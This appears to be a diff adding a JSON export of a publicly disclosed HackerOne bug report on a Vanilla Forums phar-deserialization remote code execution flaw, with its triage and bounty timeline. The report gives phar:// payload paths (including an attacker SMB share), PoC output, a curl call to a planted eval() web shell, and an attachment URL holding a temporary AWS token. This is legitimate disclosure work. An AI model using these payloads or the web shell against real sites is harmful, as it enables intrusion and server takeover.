@@ -1,0 +1,438 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:46:51.607Z", 
+    "voters": [
+        "irek", 
+        "spam404", 
+        "theappsec", 
+        "inhibitor181", 
+        "eveeez", 
+        "ahiezer", 
+        "harry_mg", 
+        "babayaga_", 
+        "mygf", 
+        "cyberunit", 
+        "and 19 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "600.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 410882, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "## Summary:\n\nAn **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- **THIS BUG IS UNAUTHENTICATED**, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of the library/core/functions.general.php file we can see the following code:\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            'Url' => $url,\n            'Title' => '',\n            'Description' => '',\n            'Images' => [],\n            'Exception' => false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {\n                throw new Exception('Invalid URL.', 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request->request([\n                'URL' => $url,\n                'Timeout' => $timeout,\n                'Cookies' => $sendCookies,\n                'Redirects' => true,\n            ]);                                                                         // 1\n\n            if (!$request->status()) {\n                throw new Exception('Couldn\\'t connect to host.', 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo['Images']) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo['Images'] = array_values($images);\n            }\n```\n\nAt [1] we can reach a HTTP SSRF with an attacker controlled `$url`. Note also that there is no authentication here. Then at [2] we can reach the `domGetImages()` function with our `$url` and `$dom` which is the response from the attackers web server.\n\nContinuing inside of the library/core/functions.general.php file we can see the following code:\n\n```\n    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom->query('img') as $element) {                                      // 3\n            $images[] = [\n                'Src' => absoluteSource($element->attr('src'), $url),                   // 4\n                'Width' => $element->attr('width'),\n                'Height' => $element->attr('height'),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo['Src'];                                                 // 5\n\n            if (strpos($image, 'doubleclick.') != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo['Height'] && $imageInfo['Width']) {\n                    $height = $imageInfo['Height'];\n                    $width = $imageInfo['Width'];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n```\n\nAt [3] the code looks for a img tag and at [4] it will set the `$images` array with the attackers controlled src attribute. Then at [5] the code sets the `$image` variable with the attackers controlled src. Finally at [6] we can reach the `getimagesize()` with an arbitrary string. \n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. \nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.8, 
+        "author_type": "User"
+    }, 
+    "title": "Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical)", 
+    "is_member_of_team?": null, 
+    "vote_count": 29, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10567, 
+            "content": "An **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.", 
+            "content_html": "<p>An <strong>unauthenticated</strong> attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "*.vanillaforums.com", 
+        "max_severity": "critical", 
+        "databaseId": 2101, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-11-23T15:46:51.645Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$600", 
+    "attachments": [
+        {
+            "file_name": "vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip", 
+            "type": "application/zip", 
+            "id": 347520, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/347/520/89a8e73e0a1e58ae204f98e45793f15f28cfbd7b/vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221403Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=886828541457cc8f34a833d606c5ec32b87fbd83220423646f1e62c1906e05a7"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-17T23:17:10.849Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-17T23:17:10.849Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Also, please note that the poc-stage-2.py will need to listen on port 9090 and the `victim` Vanilla Forums target will need to be allowed to make an out bound connection to your attacker's machine.", 
+            "markdown_message": "<p>Also, please note that the poc-stage-2.py will need to listen on port 9090 and the <code>victim</code> Vanilla Forums target will need to be allowed to make an out bound connection to your attacker&#39;s machine.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3351373, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T02:09:21.215Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T02:09:21.215Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "I forgot to mention, that the entry into the controller is in applications/dashboard/controllers/class.utilitycontroller.php:\n\n```\nclass UtilityController extends DashboardController {\n\n    ...\n\n    public function fetchPageInfo($url = '') {\n        $pageInfo = fetchPageInfo($url);                                     // 0\n\n        if (!empty($pageInfo['Exception'])) {\n            throw new Gdn_UserException($pageInfo['Exception'], 400);\n        }\n```\n\nAt [0] we call fetchPageInfo in library/core/functions.general.php.", 
+            "markdown_message": "<p>I forgot to mention, that the entry into the controller is in applications/dashboard/controllers/class.utilitycontroller.php:</p>\n<pre class=\"highlight plaintext\"><code>class UtilityController extends DashboardController {\n\n    ...\n\n    public function fetchPageInfo($url = &#39;&#39;) {\n        $pageInfo = fetchPageInfo($url);                                     // 0\n\n        if (!empty($pageInfo[&#39;Exception&#39;])) {\n            throw new Gdn_UserException($pageInfo[&#39;Exception&#39;], 400);\n        }\n</code></pre>\n<p>At [0] we call fetchPageInfo in library/core/functions.general.php.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3351648, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T13:04:15.499Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T13:04:15.499Z", 
+            "actor": {
+                "username": "dexterr", 
+                "url": "/dexterr", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/201/201/63b60a565fa550165cfe08c9d9739c7f02712a73_medium.png?1522156506"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Hi there. We have received your report, a feedback will be posted shortly.\nThank you.", 
+            "markdown_message": "<p>Hi there. We have received your report, a feedback will be posted shortly.<br>\nThank you.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3353405, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-20T13:41:50.480Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-20T13:41:50.480Z", 
+            "actor": {
+                "username": "manwithnoname", 
+                "url": "/manwithnoname", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 3362751, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "created_at": "2018-09-23T23:39:18.905Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-23T23:39:18.905Z", 
+            "actor": {
+                "username": "linc", 
+                "url": "/linc", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/136/045/e6bae7f9edf6940a514d48d769422c229000d3aa_medium.png?1495575265"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.", 
+            "markdown_message": "<p>Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3376858, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-23T23:44:45.017Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-23T23:44:45.017Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Nice @linc, can I please grab a bounty for this one?", 
+            "markdown_message": "<p>Nice <a href=\"/linc\">@linc</a>, can I please grab a bounty for this one?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3376867, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-24T03:53:53.023Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-24T03:53:53.023Z", 
+            "actor": {
+                "username": "linc", 
+                "url": "/linc", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/136/045/e6bae7f9edf6940a514d48d769422c229000d3aa_medium.png?1495575265"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Yup, expect it by end of Tuesday at the latest. I need to wait til the accountant is in the office. :o)", 
+            "markdown_message": "<p>Yup, expect it by end of Tuesday at the latest. I need to wait til the accountant is in the office. :o)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3377181, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-09-24T12:45:32.904Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-24T12:45:32.904Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "600.0", 
+            "collaborator": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3379299, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-24T13:11:02.951Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-24T13:11:02.951Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Thanks @linc !", 
+            "markdown_message": "<p>Thanks <a href=\"/linc\">@linc</a> !</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3379415, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-24T15:46:51.629Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-24T15:46:51.629Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3527257, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-23T15:46:58.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-23T15:46:58.122Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3701313, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-23T16:01:34.021Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-23T16:01:34.021Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "CVE-2018-18903", 
+            "markdown_message": "<p>CVE-2018-18903</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3701345, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "mr_me", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/mr_me", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/041/443/93e88f3b78320cbcd437c53af6b3646f5de99c84_small.jpg?1472495053"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 52, 
+        "name": "Deserialization of Untrusted Data"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1146432.050960251, 
+    "disclosed_at": "2018-11-23T15:46:58.101Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/410882", 
+    "created_at": "2018-09-17T23:05:19.946Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"summary\">Summary:</h2>\n\n<p>An <strong>unauthenticated</strong> attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.</p>\n\n<h2 id=\"notes\">Notes:</h2>\n\n<ul>\n<li>\n<strong>THIS BUG IS UNAUTHENTICATED</strong>, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.</li>\n<li>The default path to the constants.php file is &#39;/var/www/html/conf/constants.php&#39;, please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html</li>\n<li>BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!</li>\n<li>In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\nThe payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.</li>\n<li>Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.</li>\n</ul>\n\n<h2 id=\"analysis\">Analysis:</h2>\n\n<p>Inside of the library/core/functions.general.php file we can see the following code:</p>\n<pre class=\"highlight plaintext\"><code>class ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            &#39;Url&#39; =&gt; $url,\n            &#39;Title&#39; =&gt; &#39;&#39;,\n            &#39;Description&#39; =&gt; &#39;&#39;,\n            &#39;Images&#39; =&gt; [],\n            &#39;Exception&#39; =&gt; false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val(&#39;scheme&#39;, $urlParts), [&#39;http&#39;, &#39;https&#39;])) {\n                throw new Exception(&#39;Invalid URL.&#39;, 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request-&gt;request([\n                &#39;URL&#39; =&gt; $url,\n                &#39;Timeout&#39; =&gt; $timeout,\n                &#39;Cookies&#39; =&gt; $sendCookies,\n                &#39;Redirects&#39; =&gt; true,\n            ]);                                                                         // 1\n\n            if (!$request-&gt;status()) {\n                throw new Exception(&#39;Couldn\\&#39;t connect to host.&#39;, 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo[&#39;Images&#39;]) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo[&#39;Images&#39;] = array_values($images);\n            }\n</code></pre>\n<p>At [1] we can reach a HTTP SSRF with an attacker controlled <code>$url</code>. Note also that there is no authentication here. Then at [2] we can reach the <code>domGetImages()</code> function with our <code>$url</code> and <code>$dom</code> which is the response from the attackers web server.</p>\n\n<p>Continuing inside of the library/core/functions.general.php file we can see the following code:</p>\n<pre class=\"highlight plaintext\"><code>    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom-&gt;query(&#39;img&#39;) as $element) {                                      // 3\n            $images[] = [\n                &#39;Src&#39; =&gt; absoluteSource($element-&gt;attr(&#39;src&#39;), $url),                   // 4\n                &#39;Width&#39; =&gt; $element-&gt;attr(&#39;width&#39;),\n                &#39;Height&#39; =&gt; $element-&gt;attr(&#39;height&#39;),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo[&#39;Src&#39;];                                                 // 5\n\n            if (strpos($image, &#39;doubleclick.&#39;) != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo[&#39;Height&#39;] &amp;&amp; $imageInfo[&#39;Width&#39;]) {\n                    $height = $imageInfo[&#39;Height&#39;];\n                    $width = $imageInfo[&#39;Width&#39;];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n</code></pre>\n<p>At [3] the code looks for a img tag and at [4] it will set the <code>$images</code> array with the attackers controlled src attribute. Then at [5] the code sets the <code>$image</code> variable with the attackers controlled src. Finally at [6] we can reach the <code>getimagesize()</code> with an arbitrary string. </p>\n\n<h2 id=\"exploitation\">Exploitation:</h2>\n\n<p>In my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. <br>\nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.</p>\n\n<h2 id=\"example\">Example:</h2>\n\n<p>The following steps are used to re-create the vulnerability:</p>\n\n<ol>\n<li>We create our phar file:</li>\n</ol>\n\n<p><code>saturn:~ mr_me$ php poc-stage-1.php</code></p>\n\n<ol>\n<li>We run the poc-stage-2.py which will trigger the bug</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG &quot;http://172.16.175.143/?c=system(&#39;id&#39;);&quot;\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>\n<p>Now, on the victim box:</p>\n<pre class=\"highlight plaintext\"><code>steven@pluto:/var/www/html/conf$ cat constants.php \n&lt;?php if (!defined(&#39;APPLICATION&#39;)) exit();\n$a=eval($_GET[c]);//[&#39;&#39;] = &#39;&#39;;\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n</code></pre>\n<h2 id=\"references\">References:</h2>\n\n<ul>\n<li><a title=\"https://rdot.org/forum/showthread.php?t=4379\" href=\"/redirect?signature=bde15125f03789f3963f7ba663bdd1830cedd1e6&amp;url=https%3A%2F%2Frdot.org%2Fforum%2Fshowthread.php%3Ft%3D4379\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://rdot.org/forum/showthread.php?t=4379</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://vanillaforums.com", 
+            "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community.", 
+            "twitter_handle": "vanilla", 
+            "name": "Vanilla"
+        }, 
+        "handle": "vanilla", 
+        "url": "https://hackerone.com/vanilla", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/443/5df0d2dcfad30933e8b17f914d8906b5665abac8_small.png?1519846664", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 17443, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
